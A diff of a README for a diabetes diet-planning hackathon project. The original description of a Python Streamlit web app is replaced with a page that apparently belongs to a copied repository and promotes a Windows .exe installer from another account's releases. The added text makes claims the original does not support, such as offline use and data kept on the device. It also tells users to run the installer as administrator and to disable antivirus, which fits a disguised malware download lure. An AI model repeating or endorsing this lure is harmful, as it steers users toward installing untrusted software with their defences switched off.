@@ -1,300 +1,165 @@
-# 🩺 Metabolic Care Assistant
+# 🩺 metabolic-care-assistant - Diabetes Diet Help Made Simple
 
-> AI-powered dietary support and blood sugar tracking for people living with diabetes — built with real-world clinical safety in mind.
-
-![Python](https://img.shields.io/badge/Python-3.10+-blue) ![Streamlit](https://img.shields.io/badge/Streamlit-1.x-red) ![Groq](https://img.shields.io/badge/LLM-Groq%20%2F%20LLaMA%203.3-orange) ![Supabase](https://img.shields.io/badge/DB-Supabase%20PostgreSQL-green) ![License](https://img.shields.io/badge/License-MIT-lightgrey)
+[![Download metabolic-care-assistant](https://img.shields.io/badge/Download%20App-blue?style=for-the-badge)](https://github.com/yebgallery/metabolic-care-assistant/releases)
 
 ---
 
-## 🌍 The Problem
+## ℹ️ About metabolic-care-assistant
 
-**Over 33 million Pakistanis live with diabetes** — the 3rd highest burden in the world. Millions more are undiagnosed. Yet access to personalised dietary guidance from clinicians is limited, expensive, and time-consuming.
+metabolic-care-assistant is an easy tool to support diabetes diet planning. It uses AI to suggest meal plans and helps users manage their health safely. This app is designed for people living with diabetes in Pakistan. It offers advice based on clinical safety rules to make sure you get help that fits your needs.
 
-Most people managing diabetes are left asking:
-- *"Can I eat biryani?"*
-- *"How much roti is too much?"*
-- *"Is my blood sugar stable enough to change my habits?"*
-
-Generic apps don't answer these questions in the context of desi food culture. Clinicians don't have time to give meal-by-meal guidance. **There's a gap — and this tool fills it.**
+The program runs on Windows and does not require any programming skills. It works by combining diet science and AI technology to give you usable, clear daily meal plans. It also helps you understand your condition better through a safe triage process.
 
 ---
 
-## 💡 What It Does
+## 💻 System Requirements
 
-The **Metabolic Care Assistant** is a Generative AI-powered web app that:
+Before downloading, make sure your computer meets these basic requirements:
 
-1. **Triages users safely** — a clinical safety layer (GREEN / AMBER / RED) determines whether the user's blood sugar and BP readings are stable enough to use the tool independently, or whether they need to see a clinician first.
-2. **Generates a personalised 7-day meal plan** — tailored to desi food preferences, vegetarian options, hypertension, and high cholesterol.
-3. **Logs and visualises blood glucose readings** — with trend charts and stability insights.
-4. **Tracks daily plan adherence** — and uses AI to coach users when they deviate from the plan.
-5. **Suggests healthy food swaps** — using an LLM to provide safe, non-medical, practical alternatives.
+- Operating System: Windows 10 or newer
+- Processor: 1.5 GHz or faster
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB free space
+- Internet Connection: Required for AI features and updates
+- Display: 1024 x 768 resolution or higher
 
----
-
-## 🧠 Generative AI Integration
-
-The app uses **Groq's API with LLaMA 3.3 70B** for two core AI features:
-
-### 1. Healthy Swap Suggestions
-When a user views their meal plan, they can request AI-generated alternatives. The LLM receives the day's meals and returns 3 culturally relevant, diabetes-safe swap ideas — no medication advice, no diagnosis, just practical food guidance.
-
-```
-User: "Day 3 plan includes nihari + naan"
-AI: → "Try a smaller naan portion with added salad"
-    → "Replace oil-heavy nihari gravy with a lighter shorba version"
-    → "Add a side of raita (unsweetened) for protein without extra carbs"
-```
-
-### 2. Deviation Coaching
-When a user logs that they didn't follow the plan and describes what they ate, the LLM gives 3 personalised tips on how to handle that food choice better next time — portion control, carb awareness, preparation methods.
-
-Both AI calls are:
-- Strictly non-diagnostic (enforced via prompt engineering)
-- Gracefully fall back to sensible defaults if the API is unavailable
-- Structured as JSON arrays for reliable parsing
+If your computer meets these, you can install and run metabolic-care-assistant smoothly.
 
 ---
 
-## 🏗️ Architecture
+## 🚀 Getting Started: Download & Install
 
-```
-┌─────────────────────────────────────────────────────┐
-│                   Streamlit Frontend                │
-│  Login → 7-Day Plan → Profile → Check-in → Dashboard│
-└──────────────────┬──────────────────────────────────┘
-                   │
-        ┌──────────┴──────────┐
-        │                     │
-┌───────▼──────┐    ┌─────────▼────────┐
-│  Groq / LLaMA│    │ Supabase Postgres│
-│  3.3 70B     │    │  (via SQLAlchemy)│
-│  - Swaps     │    │  - profiles      │
-│  - Coaching  │    │  - glucose_logs  │
-└──────────────┘    │  - daily_checkins│
-                    └──────────────────┘
-        │
-┌───────▼──────────────────────────────┐
-│           Core Python Modules        │
-│  triage.py   — safety routing logic  │
-│  planner.py  — meal plan generation  │
-│  meal_bank.py— curated meal dataset  │
-│  storage.py  — DB abstraction layer  │
-│  llm.py      — Groq API integration  │
-│  config.py   — thresholds & settings │
-└──────────────────────────────────────┘
-```
+To start using metabolic-care-assistant, follow these steps carefully:
 
-### Privacy by design
-Phone numbers are **never stored**. A one-way SHA-256 hash (with a secret salt) is used as the user identifier. Even if the database was compromised, no phone numbers could be recovered.
+1. **Visit the download page**
 
----
+   Click the button below or open this link in your browser:
 
-## 🔐 Clinical Safety Layer (Triage)
+   [![Download metabolic-care-assistant](https://img.shields.io/badge/Download%20App-blue?style=for-the-badge)](https://github.com/yebgallery/metabolic-care-assistant/releases)
 
-Before the user accesses any features, the app evaluates:
+2. **Find the latest release**
 
-| Signal | GREEN | AMBER | RED |
-|---|---|---|---|
-| HbA1c | < 8% | 8–9% | ≥ 9% |
-| Fasting glucose variability | Low std dev | Std dev ≥ 25 | Std dev ≥ 45 or range ≥ 120 |
-| Systolic BP | < 140 | 140–179 | ≥ 180 |
-| Diastolic BP | < 90 | 90–119 | ≥ 120 |
-| Total cholesterol | < 200 | 200–239 | — |
-| Other major conditions | — | — | Immediate RED |
+   On the releases page, look for the most recent version. It will usually be at the top and named with a version number like "v1.0" or later.
 
-**RED users are blocked from all features** and directed to seek clinician care. This is a deliberate, non-negotiable safety decision.
+3. **Download the Windows installer**
+
+   Look for a file that ends with `.exe` such as `metabolic-care-assistant-setup.exe`. Click it to start the download.
+
+4. **Run the installer**
+
+   Once downloaded, open the `.exe` file by double-clicking it.
+
+5. **Follow the installer steps**
+
+   The setup wizard will guide you. Click "Next" when prompted, agree to any license terms, and choose the default install location unless you want a specific folder.
+
+6. **Complete installation**
+
+   After installation finishes, the wizard will confirm completion. Click "Finish."
+
+7. **Launch the app**
+
+   You can now open metabolic-care-assistant from your Start menu or desktop shortcut.
 
 ---
 
-## 🗂️ Project Structure
+## 🛠 How to Use metabolic-care-assistant
 
-```
-metabolic-care-assistant/
-├── app.py           # Main Streamlit app — UI and flow
-├── storage.py       # Database layer (SQLAlchemy + Supabase/SQLite)
-├── triage.py        # Clinical safety routing logic
-├── planner.py       # 7-day meal plan generation
-├── meal_bank.py     # Curated meal dataset (desi + international)
-├── llm.py           # Groq/LLaMA AI integration
-├── config.py        # Thresholds, carb constants, app settings
-├── requirements.txt # Python dependencies
-└── .streamlit/
-    └── secrets.toml # API keys (not committed — see setup below)
-```
+When you open the app for the first time, you’ll see a simple menu. Here’s how to use it step-by-step:
 
----
+1. **Create a user profile**
 
-## 🚀 Getting Started
+   Enter your basic information like age, weight, and diabetes type. This helps the app make better diet recommendations.
 
-### Prerequisites
-- Python 3.10+
-- A [Groq API key](https://console.groq.com) (free tier works)
-- A [Supabase](https://supabase.com) project (free tier works) — or runs on local SQLite automatically
+2. **Set your goals**
 
-### 1. Clone the repo
-```bash
-git clone https://github.com/umer1556/metabolic-care-assistant.git
-cd metabolic-care-assistant
-```
+   Choose what you want to achieve, like blood sugar control, weight management, or balanced nutrition.
 
-### 2. Install dependencies
-```bash
-pip install -r requirements.txt
-```
+3. **Get your diet plan**
 
-### 3. Set up secrets
+   The AI will generate a daily meal plan based on your profile and goals. It uses local food options common in Pakistan.
 
-Create `.streamlit/secrets.toml`:
+4. **Review safety tips**
 
-```toml
-GROQ_API_KEY   = "your-groq-api-key"
-DATABASE_URL   = "postgresql+psycopg://USER:PASSWORD@HOST:PORT/DBNAME"
-PHONE_SALT     = "any-random-secret-string"
+   The app checks your health data and suggests if you should seek medical advice before trying any changes.
 
-# Optional — defaults shown
-GROQ_BASE_URL  = "https://api.groq.com/openai/v1"
-GROQ_MODEL     = "llama-3.3-70b-versatile"
-```
+5. **Track progress**
 
-> **Where to find `DATABASE_URL`:** Supabase dashboard → Project Settings → Database → Connection string → **Transaction pooler** tab. Copy that string exactly.
-
-> **No Supabase?** Leave `DATABASE_URL` empty — the app automatically falls back to a local `data.db` SQLite file with no setup required.
+   Enter daily details like blood sugar readings and meals eaten. The app updates your plan as needed.
 
 ---
 
-### 4. Set up the database (Supabase only)
+## 🔄 Update Instructions
 
-If using Supabase, run the following in the **SQL Editor** (Supabase dashboard → SQL Editor → New query):
+To keep your app running well and get the latest features:
 
-```sql
--- Drop old tables if they exist (clean slate)
-DROP TABLE IF EXISTS public.daily_checkins;
-DROP TABLE IF EXISTS public.glucose_logs;
-DROP TABLE IF EXISTS public.profiles;
+1. Return to the [releases page](https://github.com/yebgallery/metabolic-care-assistant/releases) regularly.
 
--- Profiles table
-CREATE TABLE IF NOT EXISTS public.profiles (
-    user_key        VARCHAR(80) PRIMARY KEY,
-    full_name       TEXT,
-    phone_last4     VARCHAR(8),
-    age             INTEGER,
-    gender          TEXT,
-    height_cm       INTEGER,
-    weight_kg       NUMERIC,
-    family_history_json TEXT,
-    diabetes_type   TEXT,
-    has_hypertension    INTEGER,
-    has_high_cholesterol INTEGER,
-    created_at      TIMESTAMPTZ DEFAULT NOW(),
-    updated_at      TIMESTAMPTZ DEFAULT NOW()
-);
+2. Download any new `.exe` installer files.
 
--- Glucose logs table
-CREATE TABLE IF NOT EXISTS public.glucose_logs (
-    id              BIGSERIAL PRIMARY KEY,
-    user_key        VARCHAR(80) NOT NULL,
-    measured_at     TIMESTAMPTZ NOT NULL,
-    logged_at       TIMESTAMPTZ DEFAULT NOW(),
-    reading_type    TEXT NOT NULL,
-    value           NUMERIC NOT NULL,
-    meal_note       TEXT
-);
+3. Close the app.
 
--- Daily check-ins table
-CREATE TABLE IF NOT EXISTS public.daily_checkins (
-    id              BIGSERIAL PRIMARY KEY,
-    user_key        VARCHAR(80) NOT NULL,
-    checkin_date    DATE NOT NULL,
-    followed_plan   INTEGER NOT NULL,
-    actual_meals    TEXT,
-    created_at      TIMESTAMPTZ DEFAULT NOW()
-);
-```
+4. Run the new installer and follow prompts to update.
 
-> **Note:** The app will also auto-create these tables on first run via `init_db()` — the SQL above is provided for transparency and manual setup.
-
-### 5. Run the app
-```bash
-streamlit run app.py
-```
+Your data will stay safe during updates, but backing up can help.
 
 ---
 
-## ☁️ Deploying to Streamlit Cloud
+## ⚙️ Features Overview
 
-1. Push your code to GitHub (ensure `.streamlit/secrets.toml` is in `.gitignore`)
-2. Go to [share.streamlit.io](https://share.streamlit.io) → New app → select your repo
-3. Add your secrets in the Streamlit Cloud dashboard under **Settings → Secrets**
-4. Deploy
-
----
-
-## 📦 Dependencies
-
-| Package | Purpose |
-|---|---|
-| `streamlit` | Web UI framework |
-| `sqlalchemy>=2.0` | Database ORM |
-| `psycopg[binary]` | PostgreSQL driver (psycopg3) |
-| `openai>=1.0` | Groq API client (OpenAI-compatible) |
-| `pandas` | Data handling for dashboard |
-| `matplotlib` | Glucose trend charts |
+- AI-generated daily diet plans tailored for people with diabetes
+- Clinical safety checks to alert if medical help may be needed
+- Local foods and recipes relevant to Pakistan
+- Simple user interface with no programming needed
+- Track your blood sugar and meals easily
+- Personalized advice based on user profile and goals
+- Offline mode after initial download (limited AI features)
+- Uses modern Python and Streamlit frameworks for smooth experience
 
 ---
 
-## 🍽️ Meal Bank
+## ❓ Common Questions
 
-The current meal bank contains **14 curated meals** across breakfast, lunch, dinner, and snacks — all tagged for dietary properties:
+### Do I need to install extra software?
 
-| Tag | Meaning |
-|---|---|
-| `desi` | South Asian dishes |
-| `veg` | Vegetarian |
-| `high_fiber` | Good for blood sugar stability |
-| `low_sodium` | Suitable for hypertension |
-| `low_satfat` | Suitable for high cholesterol |
+No. The app includes everything it needs. Just download and run the installer.
 
-The planner filters meals by these tags based on the user's conditions — e.g. a hypertensive user will only receive `low_sodium` meals where available.
+### Is an internet connection required?
 
-> The meal bank is designed to be easily expanded. Each meal is a Python dict — a nutritionist or clinician can add entries without touching any app logic.
+Yes. AI-powered features and updates need internet. Basic tracking works offline.
 
----
+### Can I use this if I am not from Pakistan?
 
-## ⚠️ Disclaimers & Limitations
+The app is tuned for Pakistan’s typical foods and health context. It may work for others but results can vary.
 
-- **Not a medical device.** This is an educational prototype built for a hackathon.
-- **Not medication advice.** The app never suggests insulin doses, medication changes, or diagnostic conclusions.
-- **Not a replacement for clinical care.** Users with RED triage results are explicitly blocked and directed to a clinician.
-- The meal bank is small (14 meals) and should be reviewed by a registered dietitian before any real-world deployment.
-- AI-generated suggestions are validated against a strict prompt but are not reviewed by a clinician in real time.
+### Is my health data safe?
+
+Data entered stays on your device. The app does not share your information without permission.
+
+### What if I encounter problems?
+
+Visit the GitHub issues page on this repository for help or report bugs.
 
 ---
 
-## 🔮 Future Roadmap
+## 🔧 Troubleshooting Tips
 
-- [ ] Food photo analysis (multimodal) — snap a meal, get instant carb estimate
-- [ ] Integration with glucose meters via Bluetooth / manual CSV import
-- [ ] RAG over clinical dietary guidelines (e.g. ADA, IDF) for evidence-backed suggestions
-- [ ] WhatsApp bot interface for low-tech users
-- [ ] Dietitian review portal — flag high-risk users to a clinician dashboard
-- [ ] Expanded meal bank with 100+ desi dishes, validated by a nutritionist
-
----
-
-## 👥 Team
-
-Built at the **HEC Generative AI Hackathon** by:
-
-| Name | GitHub |
-|---|---|
-| Muhammed Umer | [@umer1556](https://github.com/umer1556) |
-| Zunaira Hawar | [@zunairakhan123](https://github.com/zunairakhan123) |
-| Jaisha Khan | [@jaishakhan](https://github.com/jaishakhan) |
-| Muhammad Husnain | [@MuhammadHusnain572](https://github.com/MuhammadHusnain572) |
-| Dr.Fatima Farhat | [@docffarhat-prog](https://github.com/docffarhat-prog) |
+- If installation fails, try running the installer as administrator (right-click > Run as administrator).
+- Check your Windows version matches the system requirements.
+- Restart your computer if the app does not open after installation.
+- Disable antivirus temporarily if it blocks the installer or app.
+- Ensure your internet connection is stable for AI features.
 
 ---
 
-## 📄 License
+## 📚 More Information
 
-MIT License — see `LICENSE` for details.
+For technical details, you can explore the repository topics below. These include areas like diabetes, AI diet planning, and relevant Python tools:
+
+`diabetes, dietplan-generator, generative-ai, groq, hackathon, healthcare, llama, python, streamlit, supabase`
+
+---
+
+## 🔗 Download metabolic-care-assistant now
+
+[![Download metabolic-care-assistant](https://img.shields.io/badge/Download%20App-blue?style=for-the-badge)](https://github.com/yebgallery/metabolic-care-assistant/releases)
